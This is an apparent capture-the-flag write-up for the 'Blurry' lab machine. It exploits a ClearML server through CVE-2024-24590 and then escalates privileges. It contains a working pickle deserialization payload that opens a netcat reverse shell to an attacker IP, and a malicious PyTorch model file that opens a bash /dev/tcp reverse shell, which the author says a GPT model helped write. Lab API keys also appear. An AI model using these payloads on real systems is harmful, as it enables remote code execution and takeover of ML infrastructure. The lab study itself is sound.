# Blurry Machine - Medium

- [+] : Target IP
   >>	10.10.11.19
   
## Recon 

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

### Port 80 

- [1] : http://app.blurry.htb/
  >>	targetip redirects to app.blurry.htb , blurry.htb not working .
  

- [2] : Clearml 
  >>	login page -> Users : (Chad Jippity , default user , ray flection , Car Melo , e) 

- [3] : clearml-init 
  >>    configuration on clearml 
  >>	initialized clearml and had to add to dns api and file .
  >>	clearml-server ? clearml-task 
		``ìnitialization
		seems like app.blurry.htb doesnt work , I think I have to put localhost instead of api for the web server config 
		
		clearml-init
		ClearML SDK setup process

		Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
		Or create a free account at https://app.clear.ml/settings/workspace-configuration

		In settings page, press "Create new credentials", then press "Copy to clipboard".

		Paste copied configuration here:
		api {
		  web_server: http://app.blurry.htb
		  api_server: http://api.blurry.htb
		  files_server: http://files.blurry.htb
		  credentials {
		    "access_key" = "GE0TEHKB4RCDK8R0M2YJ"
		    "secret_key" = "vksNd0Axcp7LWkTWUWA6O3zzeGZWOfWlrT1JezZcTq6HmB2qGO"
		  }
		}
		Detected credentials key="GE0TEHKB4RCDK8R0M2YJ" secret="vksN***"

		ClearML Hosts configuration:
		Web App: http://app.blurry.htb
		API: http://api.blurry.htb
		File Store: http://files.blurry.htb

		Verifying credentials ...
		Credentials verified!

		New configuration stored in /home/parrot/clearml.conf
		ClearML setup completed successfully.
		```
		
  >> App credentials :
		```app.blurry.htb
 		8TL83TDO2YXCQ4789DE4 	Jun 11 2024 15:42 	blurry 	
		43JQWWALPYM4QTJG5T6D 	Feb 17 2024 17:54 	149328d8025b
		```
- [3] :  CVE-2024–24590
  >>	[https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/]
  		```python
		from clearml import Task
		import pickle, os

		class RunCommand:
		    def __reduce__(self):
			return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.x 1234 >/tmp/f',))

		command = RunCommand()

		task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"])
		task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")
		```
		


## Privesc


- [+] : sudo -l
   >>	sudo /usr/bin/evaluate_model /models/*.pth
   >>   cat /usr/bin/evaluate_model >> GPT cuz user is jippity xD
    
- [+] : privesc way with gpt 
				import torch
				import torch.nn as nn
				import os

				class MaliciousModel(nn.Module):
				    def __init__(self):
					super(MaliciousModel, self).__init__()
					self.fc = nn.Linear(10, 1)  # Modify input and output dimensions as needed

				    def forward(self, x):
					return self.fc(x)

				    def __reduce__(self):
					# Command to establish reverse shell (replace IP and port with your listener's IP and port)
					cmd = "bash -c 'bash -i >& /dev/tcp/10.10.16.4/5555 0>&1'"
					return os.system, (cmd,)

				# Instantiate the model
				malicious_model = MaliciousModel()

				# Save the model using torch.save
				torch.save(malicious_model, 'malicious_model.pth')
				
				

